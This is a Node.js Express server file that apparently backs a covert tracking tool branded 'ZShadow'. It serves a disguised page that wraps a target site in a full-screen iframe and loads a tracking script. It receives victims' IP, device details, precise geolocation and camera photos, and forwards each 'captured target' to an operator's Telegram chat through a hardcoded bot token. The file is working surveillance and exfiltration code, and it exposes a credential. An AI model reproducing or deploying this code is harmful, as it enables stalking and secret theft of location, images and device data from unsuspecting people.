import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import FormData from "form-data";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

const BOT_TOKEN = "8975100574:AAGHgoUJQrQVQy7FCb1fpqhiZ-DHEUrwu6k";
const DB_FILE = "./database.json";

// ===== DB =====
function loadDB() {
  if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "{}");
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function generateId() {
  return Math.random().toString(36).substring(2, 8);
}

// ===== HOME =====
app.get("/", (req, res) => {
  res.send("Server Running 🚀");
});

// ===== TRACK PAGE =====
app.get("/pro/:id", (req, res) => {
  const trackingId = req.params.id;
  const db = loadDB();
  const entry = db[trackingId];

  if (!entry) return res.send("Invalid Link");

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html,body{margin:0;height:100%;overflow:hidden}
iframe{width:100%;height:100%;border:none}
</style>
</head>
<body>

<iframe src="${entry.targetUrl}"></iframe>

<script
data-tracking-id="${trackingId}"
data-server-url="https://zs-trace.onrender.com"
src="/script.js"></script>

</body>
</html>
`);
});

// ===== DATA =====
app.post("/data", async (req, res) => {
  const trackingId = req.query.trackingId;
  const data = req.body;

  const db = loadDB();
  const entry = db[trackingId];
  if (!entry) return res.sendStatus(404);

  const chatId = entry.owner;
  const targetUrl = entry.targetUrl;

  if (!data.IP_Address && !data.Device_Model) {
    return res.sendStatus(200);
  }

  const val = (v) => v || "N/A";

  // ✅ LIVE MAP LINK
  let mapLink = "❌ Not Available";
  if (data.Location?.Latitude && data.Location?.Longitude) {
    mapLink = `https://maps.google.com/?q=${data.Location.Latitude},${data.Location.Longitude}`;
  }

  try {
    const msg = `
🖥️ <b>NEW SESSION CAPTURED</b> 🖥️

┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
<b>🖥️ CYBER ACCESS LOG 🖥️</b>
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛

🕶 <b>TARGET IDENTITY</b>
════════════════════
🌐 IP        ➤ ${val(data.IP_Address)}
📶 STATUS    ➤ Online
🗣 LANG      ➤ ${val(data.Language)}

📱 <b>DEVICE SCAN</b>
════════════════════
📲 MODEL     ➤ ${val(data.Device_Model)}
⚙️ PLATFORM  ➤ ${val(data.Platform)}
🍪 COOKIES   ➤ ${val(data.Cookies_Enabled)}
🧾 AGENT     ➤ <code>${val(data.User_Agent)}</code>

🖥 <b>DISPLAY MATRIX</b>
════════════════════
📺 SCREEN    ➤ ${val(data.Screen_Resolution)}
🎨 COLORS    ➤ ${val(data.Color_Depth)}
🌍 ZONE      ➤ ${val(data.Timezone)}

🔋 <b>POWER CORE</b>
════════════════════
🔋 BATTERY   ➤ ${val(data.Battery?.Level)}
⚡ CHARGING  ➤ ${val(data.Battery?.Charging)}

⚙️ <b>HARDWARE NODE</b>
════════════════════
🧠 CPU       ➤ ${val(data.Hardware?.CPU_Cores)} Cores
💾 RAM       ➤ ${val(data.Hardware?.Device_Memory_GB)} GB

💽 <b>STORAGE TRACE</b>
════════════════════
📂 USED      ➤ ${val(data.Storage?.Used)} GB
📦 TOTAL     ➤ ${val(data.Storage?.Total)} GB

📡 <b>NETWORK SIGNAL</b>
════════════════════
📶 TYPE      ➤ ${val(data.Network_Info?.Type)}
🚀 SPEED     ➤ ${val(data.Network_Info?.Downlink_MBps)} Mb/s
📡 RTT       ➤ ${val(data.Network_Info?.RTT_ms)}
💡 SAVE DATA ➤ ${val(data.Network_Info?.Save_Data)}

📍 <b>GEO TRACKER</b>
════════════════════
📌 LAT       ➤ ${val(data.Location?.Latitude)}
📌 LONG      ➤ ${val(data.Location?.Longitude)}
🎯 ACCURACY  ➤ ${val(data.Location?.Accuracy)}
🗺 MAP       ➤ ${
  mapLink !== "❌ Not Available"
    ? `<a href="${mapLink}">📍 Open Live Location</a>`
    : "❌ Permission Denied"
}

🌍 <b>GEO DATABASE</b>
════════════════════
🌎 COUNTRY   ➤ ${val(data.Location?.Country)}
🏙 REGION    ➤ ${val(data.Location?.Region)}
🏠 CITY      ➤ ${val(data.Location?.City)}
📡 ISP       ➤ ${val(data.Location?.ISP)}

🌐 <b>LIVE TRACKING</b>
════════════════════
${
  mapLink !== "❌ Not Available"
    ? `<a href="${mapLink}">🛰️ View on Google Maps</a>`
    : "❌ Location Not Available"
}

📲 <b>DEVICE TYPE</b>
════════════════════
🛠 ${val(data.Device_Type)}

🌐 <b>BROWSER CORE</b>
════════════════════
🧠 BROWSER   ➤ ${val(data.Browser)}
⚙️ ENGINE    ➤ ${val(data.Engine)}

⏳ <b>SESSION TRACE</b>
════════════════════
🕒 TIME      ➤ ${val(data.Session?.Time)}
⌛ DURATION  ➤ ${val(data.Session?.Duration)}

━━━━━━━━━━━━━━━━━━
🎯 <b>TARGET:</b>
<code>${targetUrl}</code>

┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
⚡ <b>POWERED BY ZShadow</b> ⚡
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg,
        parse_mode: "HTML"
      })
    });

  } catch (e) {
    console.log("DATA ERROR:", e);
  }

  res.sendStatus(200);
});

// ===== PHOTO =====
app.post("/photo", async (req, res) => {
  const trackingId = req.query.trackingId;

  const db = loadDB();
  const entry = db[trackingId];
  if (!entry) return res.sendStatus(404);

  const chatId = entry.owner;
  const targetUrl = entry.targetUrl;

  try {
    const { imageData } = req.body;
    if (!imageData) return res.sendStatus(400);

    const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, `photo_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", fs.createReadStream(filePath));

    formData.append(
      "caption",
      `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`
    );

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.log("PHOTO ERROR:", err);
  }

  res.sendStatus(200);
});

// ===== START =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server Running 🚀"));